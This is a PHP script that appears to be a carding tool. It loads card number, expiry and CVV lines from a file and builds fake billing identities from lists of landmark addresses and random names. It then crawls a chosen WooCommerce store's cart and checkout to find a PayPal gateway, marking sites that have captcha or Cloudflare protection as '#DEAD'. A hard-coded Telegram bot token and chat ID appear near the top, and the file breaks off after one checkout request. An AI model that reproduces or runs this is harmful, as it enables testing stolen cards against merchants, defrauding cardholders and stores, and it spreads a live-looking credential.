<?php

// Disable unnecessary warnings and errors for clean output
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1'); // Prevent memory issues
date_default_timezone_set('Asia/Manila');

// Telegram Bot API token and chat ID
$telegramToken = "8107078866:AAEMyhBGQiCJ92CKet4bfdI1G7c_ZLBt7Gs"; // Replace with your bot token
$chatId = "-1002868735174"; // Replace with your chat ID

# ---------------- [ PHP ] ------------------- #

$lines = file("cc.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$separa = $lines[array_rand($lines)]; // random line

list($cc, $mes, $ano, $cvv) = explode("|", $separa);

if (strlen($mes) == 1) {
    $mes = "0$mes";
}

if (strlen($ano) == 2) {
    $ano = "20$ano";
} elseif (strlen($ano) != 4);


$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);

$ctype = (substr($cc, 0, 1) == 4) ? 'visa' : ((substr($cc, 0, 1) == 5) ? 'mastercard' : null);
$ctype1 = ($ctype === 'visa') ? 'VI' : (($ctype === 'mastercard') ? 'MC' : null);
$ctype2 = ($ctype === 'visa') ? 'Visa' : (($ctype === 'mastercard') ? 'Mastercard' : null);
$ctype3 = ($ctype === 'visa') ? 'VISA' : (($ctype === 'mastercard') ? 'MASTERCARD' : null);
$ctype4 = ($ctype === 'visa') ? '001' : (($ctype === 'mastercard') ? '002' : null);


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = (string) intval($mes);
    };

# -------------- [ FUNCTIONS ] -------- #


function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


# ---------- [ FORMKEY ] --- #
function GetRandomWord($len = 20) {

    $word = array_merge(range('a', 'z'), range('A', 'Z'));

    shuffle($word);
    return substr(implode($word), 0, $len);
}
$rcocks = GetRandomWord();
$formkey = substr(str_shuffle(mt_rand().mt_rand().$rcocks), 0, 16);
$Webkit = substr(str_shuffle(mt_rand().mt_rand().$Random), 0, 16);

# ---------------- [ DEVICE/CORRELATION ID ] ----- #
function DeviceID($length)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$DeviceSessionID = DeviceID(32);

#---------------- [ USER AGENT ] ------------------#

$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
];

// Pagpili ng random na user agent
$ua = $user_agents[array_rand($user_agents)];

#---------------- [ A D D R E S S ] --------------#
$urlComponents = parse_url($final_url);
$site2 = strtolower($urlComponents['host'] ?? '');

$addresses = [
'NZ' => [
    [
        'street' => '248 Princes Street',
        'city' => 'Grafton',
        'zip' => '1010',
        'state' => 'Auckland',
        'phone' => '(028) 8784-059',
    ],
    [
        'street' => '75 Queen Street',
        'city' => 'Auckland',
        'zip' => '1010',
        'state' => 'Auckland',
        'phone' => '(029) 1234-567',
    ],
    [
        'street' => '12 Victoria Avenue',
        'city' => 'Wanganui',
        'zip' => '4500',
        'state' => 'Manawatu-Wanganui',
        'phone' => '(021) 9876-543',
    ],
    [
        'street' => '34 Durham Street',
        'city' => 'Tauranga',
        'zip' => '3110',
        'state' => 'Bay of Plenty',
        'phone' => '(020) 1122-3344',
    ],
    [
        'street' => '9 Lambie Drive',
        'city' => 'Manukau',
        'zip' => '2025',
        'state' => 'Auckland',
        'phone' => '(027) 4444-555',
    ],
    [
        'street' => '153 Featherston Street',
        'city' => 'Wellington',
        'zip' => '6011',
        'state' => 'Wellington',
        'phone' => '(022) 3333-444',
    ],
    [
        'street' => '58 Moorhouse Avenue',
        'city' => 'Christchurch',
        'zip' => '8011',
        'state' => 'Canterbury',
        'phone' => '(023) 5555-666',
    ],
    ],
'AU' => [
    [
        'street' => '123 George Street',
        'city' => 'Sydney',
        'zip' => '2000',
        'state' => 'NSW',
        'phone' => '+61 2 1234 5678',
    ],
    [
        'street' => '456 Collins Street',
        'city' => 'Melbourne',
        'zip' => '3000',
        'state' => 'VIC',
        'phone' => '+61 3 8765 4321',
    ],
    [
        'street' => '789 Queen Street',
        'city' => 'Brisbane',
        'zip' => '4000',
        'state' => 'QLD',
        'phone' => '+61 7 9876 5432',
    ],
    [
        'street' => '101 King William Street',
        'city' => 'Adelaide',
        'zip' => '5000',
        'state' => 'SA',
        'phone' => '+61 8 1234 5678',
    ],
    [
        'street' => '202 Murray Street',
        'city' => 'Perth',
        'zip' => '6000',
        'state' => 'WA',
        'phone' => '+61 8 8765 4321',
    ],
    [
        'street' => '303 Hobart Road',
        'city' => 'Hobart',
        'zip' => '7000',
        'state' => 'TAS',
        'phone' => '+61 3 1234 9876',
    ],
    [
        'street' => '404 Darwin Avenue',
        'city' => 'Darwin',
        'zip' => '0800',
        'state' => 'NT',
        'phone' => '+61 8 8765 1234',
    ],
    ],
'JP' => [
    [
        'street' => '1 Chome-1-2 Oshiage',
        'city' => 'Sumida City, Tokyo',
        'zip' => '131-0045',
        'state' => 'Tokyo',
        'phone' => '+81 3-1234-5678',
    ],
    [
        'street' => '2-3-4 Shinjuku',
        'city' => 'Shinjuku, Tokyo',
        'zip' => '160-0022',
        'state' => 'Tokyo',
        'phone' => '+81 3-8765-4321',
    ],
    [
        'street' => '3 Chome-5-6 Akihabara',
        'city' => 'Chiyoda City, Tokyo',
        'zip' => '101-0021',
        'state' => 'Tokyo',
        'phone' => '+81 3-2345-6789',
    ],
    [
        'street' => '4-7-8 Ginza',
        'city' => 'Chuo City, Tokyo',
        'zip' => '104-0061',
        'state' => 'Tokyo',
        'phone' => '+81 3-3456-7890',
    ],
    [
        'street' => '5-9-10 Roppongi',
        'city' => 'Minato City, Tokyo',
        'zip' => '106-0032',
        'state' => 'Tokyo',
        'phone' => '+81 3-4567-8901',
    ],
    [
        'street' => '6-11-12 Harajuku',
        'city' => 'Shibuya City, Tokyo',
        'zip' => '150-0001',
        'state' => 'Tokyo',
        'phone' => '+81 3-5678-9012',
    ],
    [
        'street' => '7-13-14 Ueno',
        'city' => 'Taito City, Tokyo',
        'zip' => '110-0005',
        'state' => 'Tokyo',
        'phone' => '+81 3-6789-0123',
    ],
    ],
 'PH' => [
    [
        'street' => '1234 Makati Ave',
        'city' => 'Makati',
        'zip' => '1200',
        'state' => 'Metro Manila',
        'phone' => '+63 2 1234 5678',
    ],
    [
        'street' => '5678 Bonifacio Drive',
        'city' => 'Taguig',
        'zip' => '1634',
        'state' => 'Metro Manila',
        'phone' => '+63 2 8765 4321',
    ],
    [
        'street' => '4321 Quezon Blvd',
        'city' => 'Quezon City',
        'zip' => '1100',
        'state' => 'Metro Manila',
        'phone' => '+63 2 3344 5566',
    ],
    [
        'street' => '7890 Cebu South Rd',
        'city' => 'Cebu City',
        'zip' => '6000',
        'state' => 'Central Visayas',
        'phone' => '+63 32 123 4567',
    ],
    [
        'street' => '2468 Davao St',
        'city' => 'Davao City',
        'zip' => '8000',
        'state' => 'Davao Region',
        'phone' => '+63 82 987 6543',
    ],
    [
        'street' => '1357 Iloilo Blvd',
        'city' => 'Iloilo City',
        'zip' => '5000',
        'state' => 'Western Visayas',
        'phone' => '+63 33 765 4321',
    ],
    [
        'street' => '3690 Bacolod St',
        'city' => 'Bacolod City',
        'zip' => '6100',
        'state' => 'Western Visayas',
        'phone' => '+63 34 234 5678',
    ],
    ],
    'MY' => [
    [
        'street' => 'No 56, Jalan Bukit Bintang',
        'city' => 'Kuala Lumpur',
        'zip' => '55100',
        'state' => 'Wilayah Persekutuan',
        'phone' => '+60 3-1234 5678',
    ],
    [
        'street' => '700 Jln Sultan Iskandar Bintulu Service Industrial Est Bintulu Bintulu',
        'city' => 'Bintulu',
        'zip' => '97000',
        'state' => 'Sarawak',
        'phone' => '+60 608-6366666',
    ],
    [
        'street' => 'No 78, Jalan Ampang',
        'city' => 'Kuala Lumpur',
        'zip' => '50450',
        'state' => 'Wilayah Persekutuan',
        'phone' => '+60 3-8765 4321',
    ],
    [
        'street' => 'Lot 12, Jalan Tunku Abdul Rahman',
        'city' => 'Kuala Lumpur',
        'zip' => '50100',
        'state' => 'Wilayah Persekutuan',
        'phone' => '+60 3-9988 7766',
    ],
    [
        'street' => '123, Jalan Setia Raja',
        'city' => 'Ipoh',
        'zip' => '30000',
        'state' => 'Perak',
        'phone' => '+60 5-254 6789',
    ],
    [
        'street' => '45, Jalan Merdeka',
        'city' => 'George Town',
        'zip' => '10200',
        'state' => 'Penang',
        'phone' => '+60 4-222 3333',
    ],
    [
        'street' => '89, Jalan Bukit Rimau',
        'city' => 'Shah Alam',
        'zip' => '40000',
        'state' => 'Selangor',
        'phone' => '+60 3-5566 7788',
    ],
    [
        'street' => '12, Jalan Selesa Jaya',
        'city' => 'Johor Bahru',
        'zip' => '80000',
        'state' => 'Johor',
        'phone' => '+60 7-333 4444',
    ],
    ],
   'GB' => [
    [
        'street' => '10 Downing Street',
        'city' => 'London',
        'zip' => 'SW1A 2AA',
        'state' => '',
        'phone' => '+44 20 7925 0918',
    ],
    [
        'street' => '221B Baker Street',
        'city' => 'London',
        'zip' => 'NW1 6XE',
        'state' => '',
        'phone' => '+44 20 7224 3688',
    ],
    [
        'street' => '160 Piccadilly',
        'city' => 'London',
        'zip' => 'W1J 9EB',
        'state' => '',
        'phone' => '+44 20 7493 4944',
    ],
    [
        'street' => '30 St Mary Axe',
        'city' => 'London',
        'zip' => 'EC3A 8BF',
        'state' => '',
        'phone' => '+44 20 7626 1600',
    ],
    [
        'street' => '1-5 Cannon Street',
        'city' => 'London',
        'zip' => 'EC4N 5DX',
        'state' => '',
        'phone' => '+44 20 7606 1000',
    ],
    [
        'street' => '14 Regent Street',
        'city' => 'London',
        'zip' => 'SW1Y 4PH',
        'state' => '',
        'phone' => '+44 20 7930 0800',
    ],
    [
        'street' => '50 Queen Victoria Street',
        'city' => 'London',
        'zip' => 'EC4N 4SA',
        'state' => '',
        'phone' => '+44 20 7283 4000',
    ],
    ],
    'CA' => [
    [
        'street' => '123 Main Street',
        'city' => 'Toronto',
        'zip' => 'M5H 2N2',
        'state' => 'Ontario',
        'phone' => '(416) 555-0123',
    ],
    [
        'street' => '456 Maple Avenue',
        'city' => 'Vancouver',
        'zip' => 'V6E 1B5',
        'state' => 'British Columbia',
        'phone' => '(604) 555-7890',
    ],
    [
        'street' => '789 King Street',
        'city' => 'Montreal',
        'zip' => 'H3A 1J9',
        'state' => 'Quebec',
        'phone' => '(514) 555-3456',
    ],
    [
        'street' => '101 Wellington Street',
        'city' => 'Ottawa',
        'zip' => 'K1A 0A9',
        'state' => 'Ontario',
        'phone' => '(613) 555-6789',
    ],
    [
        'street' => '202 Spring Garden Road',
        'city' => 'Halifax',
        'zip' => 'B3J 1Y5',
        'state' => 'Nova Scotia',
        'phone' => '(902) 555-4321',
    ],
   ],
   'SG' => [
    [
        'street' => '10 Anson Road',
        'city' => 'Singapore',
        'zip' => '079903',
        'state' => 'Central Region',
        'phone' => '(+65) 6221-1234',
    ],
    [
        'street' => '1 Raffles Place',
        'city' => 'Singapore',
        'zip' => '048616',
        'state' => 'Central Region',
        'phone' => '(+65) 6532-5678',
    ],
    [
        'street' => '101 Thomson Road',
        'city' => 'Singapore',
        'zip' => '307591',
        'state' => 'Central Region',
        'phone' => '(+65) 6253-4567',
    ],
    [
        'street' => '3 Temasek Boulevard',
        'city' => 'Singapore',
        'zip' => '038983',
        'state' => 'Central Region',
        'phone' => '(+65) 6333-7890',
    ],
    [
        'street' => '400 Orchard Road',
        'city' => 'Singapore',
        'zip' => '238875',
        'state' => 'Central Region',
        'phone' => '(+65) 6738-1122',
    ],
   ],
   'TH' => [
    [
        'street' => '123 Sukhumvit Road',
        'city' => 'Bangkok',
        'zip' => '10110',
        'state' => 'Bangkok',
        'phone' => '(+66) 2-123-4567',
    ],
    [
        'street' => '456 Silom Road',
        'city' => 'Bangkok',
        'zip' => '10500',
        'state' => 'Bangkok',
        'phone' => '(+66) 2-234-5678',
    ],
    [
        'street' => '789 Nimmanhemin Road',
        'city' => 'Chiang Mai',
        'zip' => '50200',
        'state' => 'Chiang Mai',
        'phone' => '(+66) 53-345-678',
    ],
    [
        'street' => '12 Ratchadamnoen Road',
        'city' => 'Ayutthaya',
        'zip' => '13000',
        'state' => 'Phra Nakhon Si Ayutthaya',
        'phone' => '(+66) 35-212-345',
    ],
    [
        'street' => '55 Pattaya Beach Road',
        'city' => 'Pattaya',
        'zip' => '20150',
        'state' => 'Chonburi',
        'phone' => '(+66) 38-412-345',
    ],
    ],
    'HK' => [
    [
        'street' => '1 Queen’s Road Central',
        'city' => 'Central',
        'zip' => '',
        'state' => 'Hong Kong Island',
        'phone' => '(+852) 2523-1234',
    ],
    [
        'street' => '88 Gloucester Road',
        'city' => 'Wan Chai',
        'zip' => '',
        'state' => 'Hong Kong Island',
        'phone' => '(+852) 2598-5678',
    ],
    [
        'street' => '15 Salisbury Road',
        'city' => 'Tsim Sha Tsui',
        'zip' => '',
        'state' => 'Kowloon',
        'phone' => '(+852) 2312-3456',
    ],
    [
        'street' => '18 Nathan Road',
        'city' => 'Mong Kok',
        'zip' => '',
        'state' => 'Kowloon',
        'phone' => '(+852) 2384-7890',
    ],
    [
        'street' => '28 Tung Chung Road',
        'city' => 'Lantau Island',
        'zip' => '',
        'state' => 'New Territories',
        'phone' => '(+852) 2985-1234',
    ],
],
'ZA' => [
    [
        'street' => '10 Adderley Street',
        'city' => 'Cape Town',
        'zip' => '8000',
        'state' => 'Western Cape',
        'phone' => '(+27) 21-123-4567',
    ],
    [
        'street' => '150 Rivonia Road',
        'city' => 'Sandton',
        'zip' => '2196',
        'state' => 'Gauteng',
        'phone' => '(+27) 11-234-5678',
    ],
    [
        'street' => '45 Florida Road',
        'city' => 'Durban',
        'zip' => '4001',
        'state' => 'KwaZulu-Natal',
        'phone' => '(+27) 31-345-6789',
    ],
    [
        'street' => '33 Church Street',
        'city' => 'Stellenbosch',
        'zip' => '7600',
        'state' => 'Western Cape',
        'phone' => '(+27) 21-888-1111',
    ],
    [
        'street' => '88 Voortrekker Road',
        'city' => 'Bellville',
        'zip' => '7530',
        'state' => 'Western Cape',
        'phone' => '(+27) 21-555-2222',
    ],
],
    'NL' => [
    [
        'street' => '1 Dam Square',
        'city' => 'Amsterdam',
        'zip' => '1012 JS',
        'state' => 'North Holland',
        'phone' => '(+31) 20-555-1234',
    ],
    [
        'street' => '100 Mauritskade',
        'city' => 'The Hague',
        'zip' => '2599 BR',
        'state' => 'South Holland',
        'phone' => '(+31) 70-789-4567',
    ],
    [
        'street' => '50 Binnenrotte',
        'city' => 'Rotterdam',
        'zip' => '3011 HC',
        'state' => 'South Holland',
        'phone' => '(+31) 10-234-5678',
    ],
    [
        'street' => '10 Grote Markt',
        'city' => 'Groningen',
        'zip' => '9711 LV',
        'state' => 'Groningen',
        'phone' => '(+31) 50-123-4567',
    ],
    [
        'street' => '5 Domplein',
        'city' => 'Utrecht',
        'zip' => '3512 JC',
        'state' => 'Utrecht',
        'phone' => '(+31) 30-555-7890',
    ],
    ],
   'US' => [
    [
        'street' => '1600 Pennsylvania Avenue NW',
        'city' => 'Washington',
        'zip' => '20500',
        'state' => 'DC',
        'phone' => '+1 202-456-1111',
    ],
    [
        'street' => '1 Infinite Loop',
        'city' => 'Cupertino',
        'zip' => '95014',
        'state' => 'CA',
        'phone' => '+1 408-996-1010',
    ],
    [
        'street' => '350 Fifth Avenue',
        'city' => 'New York',
        'zip' => '10118',
        'state' => 'NY',
        'phone' => '+1 212-736-3100',
    ],
    [
        'street' => '221B Baker Street',
        'city' => 'New York',
        'zip' => '10001',
        'state' => 'NY',
        'phone' => '+1 212-555-0101',
    ],
    [
        'street' => '500 S Buena Vista St',
        'city' => 'Burbank',
        'zip' => '91521',
        'state' => 'CA',
        'phone' => '+1 818-560-1000',
    ],
    [
        'street' => '1 Microsoft Way',
        'city' => 'Redmond',
        'zip' => '98052',
        'state' => 'WA',
        'phone' => '+1 425-882-8080',
    ],
    [
        'street' => '160 Spear Street',
        'city' => 'San Francisco',
        'zip' => '94105',
        'state' => 'CA',
        'phone' => '+1 415-555-0199',
    ],
    ],
];

// Determine country based on site domain
if (str_ends_with($site2, '.co.uk')) {
    $country = 'GB';
} elseif (str_ends_with($site2, '.au')) {
    $country = 'AU';
} elseif (str_ends_with($site2, '.ca')) {
    $country = 'CA';
} elseif (str_ends_with($site2, '.co.nz')) {
    $country = 'NZ';
} elseif (str_ends_with($site2, '.jp')) {
    $country = 'JP';
} elseif (str_ends_with($site2, '.ph')) {
    $country = 'PH';
} elseif (str_ends_with($site2, '.my')) {
    $country = 'MY';
} elseif (str_ends_with($site2, '.sg')) {
    $country = 'SG';
} elseif (str_ends_with($site2, '.th')) {
    $country = 'TH';
} elseif (str_ends_with($site2, '.nl')) {
    $country = 'NL';
} elseif (str_ends_with($site2, '.hk')) {
    $country = 'HK';
} elseif (str_ends_with($site2, '.co.za')) {
    $country = 'ZA';
} else {
    $country = 'US';
}

// Select addresses for the country; fallback to US if country not found
if (!isset($addresses[$country])) {
    $country = 'GB';
}

// Rotate index (every 10 seconds toggles between 0 and 1)
$index = (int)(time() / 10) % 2;

// Pick the rotating address
$selectedAddress = $addresses[$country][$index];

// Assign to variables
$street = $selectedAddress['street'];
$city = $selectedAddress['city'];
$zip = $selectedAddress['zip'];
$state = $selectedAddress['state'];
$phone = $selectedAddress['phone'];

// Function to generate a random name
function generateRandomName() {
    $firstNames = ['John', 'Kyla', 'Sarah', 'Michael', 'Emma', 'James', 'Olivia', 'William', 'Ava', 'Benjamin',
'Isabella', 'Jacob', 'Lily', 'Daniel', 'Mia', 'Alexander', 'Charlotte', 'Samuel', 'Sophia', 'Matthew',
'Amelia', 'David', 'Chloe', 'Luke', 'Ella', 'Henry', 'Grace', 'Andrew', 'Natalie', 'Ethan',
'Harper', 'Jack', 'Scarlett', 'Ryan', 'Abigail', 'Noah', 'Leah', 'Joshua', 'Zoe', 'Caleb',
'Alice', 'Nathan', 'Hannah', 'Isaac', 'Victoria', 'Mason', 'Audrey', 'Elijah', 'Evelyn', 'Dylan',
'Madison', 'Aaron', 'Lucy', 'Thomas', 'Ruby', 'Christopher', 'Penelope', 'George', 'Sadie', 'Logan',
'Ellie', 'Anthony', 'Hazel', 'Samuel', 'Nora', 'Gabriel', 'Aurora', 'Jack', 'Caroline', 'Ryan',
'Stella', 'Owen', 'Riley', 'Julian', 'Sienna', 'Daniel', 'Clara', 'Matthew', 'Leah', 'Oliver',
'Lily', 'Max', 'Violet', 'Aiden', 'Lila', 'Sebastian', 'Daisy', 'Wyatt', 'Clara', 'Leo',
'Madison', 'Finn', 'Eva', 'Jackson', 'Isla', 'Arthur', 'Eliza', 'Charles', 'Amelia', 'Oscar',
'Sophia', 'Victor'];
    $lastNames = ['Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Davis', 'Miller', 'Wilson', 'Moore', 'Taylor',
'Anderson', 'Thomas', 'Jackson', 'White', 'Harris', 'Martin', 'Thompson', 'Garcia', 'Martinez', 'Roberts',
'Walker', 'Perez', 'Young', 'Allen', 'King', 'Wright', 'Scott', 'Green', 'Adams', 'Baker',
'Gonzalez', 'Nelson', 'Carter', 'Mitchell', 'Evans', 'Collins', 'Stewart', 'Sanchez', 'Morales', 'Murphy',
'Cook', 'Rogers', 'Morgan', 'Bell', 'Cooper', 'Reed', 'Bailey', 'Gomez', 'Lambert', 'Parker',
'Watson', 'Brooks', 'Kelly', 'Sanders', 'Price', 'Bennett', 'Wood', 'Barnes', 'Ross', 'Hughes',
'Ward', 'Flores', 'Russell', 'Diaz', 'Ramirez', 'Jenkins', 'Perry', 'Powell', 'Long', 'Foster',
'Grant', 'Harrison', 'Hawkins', 'Curtis', 'Chavez', 'George', 'Simmons', 'Webb', 'Bryant', 'Alexander',
'Johnston', 'Mendoza', 'Bowman', 'Ryan', 'Sullivan', 'Freeman', 'Graham', 'Kim', 'Cameron', 'Simpson',
'Holland', 'Vasquez', 'Patel', 'Morris', 'Robinson', 'Hicks', 'Kimberly', 'Richardson', 'Lynch', 'Chapman',
'Vega', 'Patterson', 'Craig', 'Nichols', 'Gibson', 'Hunter', 'Diaz', 'Harrison', 'Bishop', 'Shaw'];

$numNames = ['345', '562', '754', '128', '934', '287', '619', '480', '731', '296',
 '853', '472', '901', '384', '659', '712', '145', '563', '839', '270',
 '418', '997', '530', '626', '711', '320', '574', '899', '265', '431',
 '801', '347', '154', '987', '672', '390', '528', '743', '615', '204',
 '832', '417', '976', '258', '690', '781', '335', '463', '709', '526',
 '613', '788', '294', '841', '359', '497', '603', '722', '385', '909',
 '547', '824', '395', '681', '757', '312', '430', '680', '549', '893',
 '364', '715', '452', '607', '758', '293', '812', '460', '533', '728',
 '341', '678', '890', '425', '610', '795', '376', '682', '924', '357',
 '489', '620', '739', '263', '569', '405', '631', '750', '171', '213',
 '456', '184', '638', '897', '869', '707', '602', '198', '446', '386',
 '744', '990', '406', '842', '329', '597', '468', '855', '782', '700',
 '356', '983', '290', '438', '550', '741', '192', '888', '311', '920',
 '451', '779', '316', '710', '225', '594', '205', '919', '161', '732',
 '437', '701', '377', '542', '668', '900', '838', '646', '180', '879',
 '811', '699', '544', '388', '511', '488', '777', '598', '883', '109',
 '693', '906', '876', '521', '834', '786', '244', '328', '172', '498',
 '917', '692', '653', '361', '209', '441', '845', '515', '866', '321',
 '271', '652', '478', '604', '729', '666', '327', '408'];
 
    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];

    return [$firstName, $lastName];
}

// Function to generate a random email domain
function generateRandomEmailDomain() {
    $domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'edu.ph', 'edu.pl',
'icloud.com', 'zoho.com', 'aol.com', 'protonmail.com', 'hotmail.com',
'mail.com', 'live.com', 'fastmail.com', 'gmx.com', 'mail.ru',
'ymail.com', 'inbox.com', 'tutanota.com', 'yandex.com', 'rocketmail.com',
'lavabit.com', 'comcast.net', 'btinternet.com', 'seznam.cz', 'orange.fr'];
    return $domains[array_rand($domains)];
}

// Generate random name
list($fname, $lname) = generateRandomName();
$emailDomain = generateRandomEmailDomain();
$email = strtolower($fname . '.' . $lname . '@' . $emailDomain);

///---------------------------------------------------------------\\\



  # -------------- [ START PROXY ] -------------- #

// Utility function to extract content between start and end strings
function extractBetween($string, $start, $end) {
    $str = explode($start, $string);
    if (isset($str[1])) {
        $str = explode($end, $str[1]);
        return $str[0];
    }
    return false;
}

// Function to get geolocation from domain
function getGeolocation($domain) {
    $ip = gethostbyname($domain);
    $url = "http://ip-api.com/json/$ip";
    
    $response = file_get_contents($url);
    $data = json_decode($response, true);

    return ($data && isset($data['countryCode'])) ? $data['countryCode'] : "Unknown";
}

$ct = getGeolocation($domain);

// Function to detect CAPTCHA presence
function detectCaptcha($htmlContent) {
    $captchaKeywords = ['sitekey', 'data-sitekey', 'recaptcha', 'g-recaptcha', 'hcaptcha', 'captcha'];
    foreach ($captchaKeywords as $keyword) {
        if (stripos($htmlContent, $keyword) !== false) {
            return true;
        }
    }
    return false;
}

// Function to detect Cloudflare protection
function detectCloudflare($htmlContent) {
    $cloudflareKeywords = ['cloudflare', 'cf-challenge', 'cf-bm', 'cf-ray', 'cf-captcha'];
    foreach ($cloudflareKeywords as $keyword) {
        if (stripos($htmlContent, $keyword) !== false) {
            return true;
        }
    }
    return false;
}

// Fetch URL using cURL with retries
function fetchUrl($url, $cookies, $isPost = false, $postData = [], &$retryCount = 0) {
    $retry = 3;
    while ($retry > 0) {
        $retryCount++;

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_COOKIEFILE => $cookies,
            CURLOPT_COOKIEJAR => $cookies,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_HTTPHEADER => [
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
            ],
        ]);

        if ($isPost) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        }

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode == 200 && !empty($response)) {
            return $response;
        }

        $retry--;
        usleep(500000);
    }
    return false;
}

extract($_GET);

$domain = trim(strtolower($_GET['lista']));

// If no scheme, add http:// temporarily
if (!preg_match('#^https?://#i', $domain)) {
    $domain = 'http://' . $domain;
}

$parsed = parse_url($domain);
$domain = $parsed['host'] ?? '';
$lista = $domain;

if (!filter_var("https://$domain", FILTER_VALIDATE_URL)) {
    echo '#DEAD<br><font color=red><small>[INVALID DOMAIN FORMAT]<br>';
    exit();
}

$startTime = microtime(true);
$cookieJar = tempnam(sys_get_temp_dir(), 'cookie');
@unlink($cookieJar);
$retryCount = 0;

// 1. Get product page
$productPage = fetchUrl("https://$domain/?s=&post_type=product", $cookieJar, false, [], $retryCount);

if (!$productPage) {
    echo ' #DEAD<br><font color=red><small>[PRODUCT PAGE ERROR]<br>';
    exit();
}

// 2. Extract product ID
$addToCartId = extractBetween($productPage, '<a href="?add-to-cart=', '"');
if (!$addToCartId) {
    $addToCartId = extractBetween($productPage, 'data-product_id="', '"');
}

if (!$addToCartId) {
    echo ' #DEAD<br><font color=red><small>[MISSING CART ID]<br>';
    exit();
}

// 3. Add product to cart
$addToCartResponse = fetchUrl("https://$domain/?add-to-cart=$addToCartId", $cookieJar, true, ['quantity' => 1], $retryCount);

if (!$addToCartResponse) {
    echo ' #DEAD<br><font color=red><small>[ATC ERROR]<br>';
    exit();
}

// Extract redirect location (if any)
preg_match('/Location:\s*(\S+)/i', $addToCartResponse, $match);
$directlink = $match[1] ?? "https://$domain/?add-to-cart=$addToCartId&quantity=1";
$ppage = $match[1] ?? "https://$domain/?p=$addToCartId";

// 4. Checkout page
$checkoutPage = fetchUrl("https://$domain/checkout/", $cookieJar, false, [], $retryCount);


if (!$checkoutPage) {
    echo ' #DEAD<br><font color=red><small>[CHECKOUT PAGE ERROR]<br>';
    exit();
}

// 5. Extract payment methods
preg_match_all('/type="radio" class="input-radio" name="payment_method" value="(.*?)"/', $checkoutPage, $matches);

if (!isset($matches[1]) || empty($matches[1])) {
    echo ' #DEAD<br><font color=red><small>[PAYMEMT METHOD FAILED TO CAPTURE]<br>';
    exit();
}




$paymentMethodsArray = $matches[1];
$hasCaptcha = detectCaptcha($checkoutPage);
$hasCloudflare = detectCloudflare($checkoutPage);

$endTime = microtime(true);
$executionTime = round($endTime - $startTime, 2);

$captchaStatus = $hasCaptcha ? "YES" : "NO";

if ($captchaStatus === "YES") {
    echo ' #DEAD<br><font color=red><small>[CAPTCHA]<br>';
    exit();
}


$cloudflareStatus = $hasCloudflare ? "YES" : "NO";

if ($cloudflareStatus === "YES") {
    echo ' #DEAD<br><font color=red><small>[CLOUDFLARE]<br>';
    exit();
}


$paymentList = implode(",", $paymentMethodsArray);

if (strpos($paymentList, 'ppcp-gateway') === false) {
    exit(
        '#MID
        <br>PAYMENT METHOD 💵:[' . $paymentList . ']
        <br>COUNTRY 🌎:' . getGeolocation($domain) . '
        <br>CAPTCHA 🔄:' . $captchaStatus . '
        <br>CLOUDFLARE ☁️: ' . $cloudflareStatus . '
        <br>TIME 🕒: ' . $executionTime . 's<br><br>'
    );
}

// Join all payment methods into a string
$paymentMatched = false;


// Final result display based on CAPTCHA detectio
    // If no payment methods matched, check for CAPTCHA and Cloudflare
    if ($hasCaptcha) {
        echo ' #DEAD<br><font color=red><small>[CAPTCHA]<br>';
        exit();
    }
    
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$domain/checkout/");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'User-Agent: '.$ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookieJar, CURLOPT_COOKIEJAR => $cookieJar]);

$Checkout = curl_exec($ch);
curl_close($ch);
